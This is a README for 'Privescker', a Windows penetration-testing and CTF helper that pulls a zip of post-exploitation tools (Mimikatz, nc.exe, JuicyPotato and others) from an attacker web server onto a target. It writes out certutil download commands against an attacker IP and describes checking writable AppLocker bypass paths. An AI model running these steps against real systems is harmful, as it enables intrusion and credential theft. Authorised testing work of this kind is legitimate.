# Privescker

**Advisory**

All the binaries/scripts/code of Privescker should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.
* * *

**What is Privescker?**

This was a tool I created to make life easier when doing CTF exercises on Windows machines. Initially I created Privescker to embed a number of binaries which would be dumped onto the target when executed. However, I thought a way of making it more customisable without recompiling every time you want a new binary I made this version posted here.

Privescker is a single binary that will download a single **zip** file containing all of your favourite Windows enumeration tools and scripts and then extract them on the target.

**Now you may think - why bother with the binary and just extract the zip yourself?**

It's not that simple. In a cmd shell it's a pain in the backside especially on older versions of Windows. PowerShell is doable but you may have instances where PowerShell is limited or not available at all.

**Other things it can do**

I have also built in the functionality to pass an argument and check AppLocker bypass locations to see whether you have write access to them. This is very handy when working on restrictive boxes.

```
privescker.exe -p
```

I have more planned for future released such as building your zip files and getting the latest versions of specific tools for you depending on user configs and other ideas. More to come on this in future.

**The manual way**

We all know the manual way of dumping files onto Windows is quite laborious, especially in older versions of Windows such as:
```
certutil -urlcache -f http://10.10.14.12:8000/enum.exe c:\users\public\enum.exe
```
Now multiply that by all the scripts, enum and post exploitation tools you want on the machine and it becomes time consuming.

**The Privescker way**

Once the privescker.exe binary is on the machine:
```
privescker.exe -u http://10.10.14.12:8000/enum-tools.zip -p c:\users\public
```

Then all your files you need to move to Windows will be dumped to the location you chose.

**Notes**

This is probably not advised on pentests as I'm sure AV will light up like a Christmas tree with all the different scripts and tools being extracted on the machine.

**Usage**

First you will need to get all your common and favourite tools and scripts and add them to a zip file on your attack machine (you can add subfolders within your zip if you please).

Personally here are some of the ones I have:
- accesschk.exe
- jaws.ps1
- nc.exe
- plink.exe
- PowerUp.ps1
- Seatbelt.exe
- SharpHound.exe
- SharpHound.ps1
- Sherlock.ps1
- Watson.exe
- winPEAS.bat
- winPEAS.exe
- JuicyPotato.exe
- PrintSpoofer.exe
- RunAsUser.exe
- Mimikatz.exe
- wget.exe

The choice is yours, add what you want.

The next step is to set up a webserver on your attack box, for example:
```
python -m SimpleHTTPServer
```

Now from your Windows shell, download privescker.exe;

```
certutil -urlcache -f http://10.10.14.12:8000/privescker.exe c:\users\public\privescker.exe
```

Leaving your webserver running, just execute privescker like this to get all your favourite tools.

```
privescker.exe -u http://10.10.14.12:8000/enum-tools.zip -o c:\users\public
```

That is literally it - small simple tool to make life easier with getting all your common enumeration, privesc and post exploitation tools on the machine for you in one go.

Hope others find it helpful.

Feel free to use the Release version or compile it yourself if you prefer.

:-)

**Screenshots**

Help menu:

![](/screenshots/help.png)

Print AppLocker writable bypass locations:

![](/screenshots/printpaths.png)

Executing the tool:

![](/screenshots/running.png)

Showing the output:

![](/screenshots/dir.png)






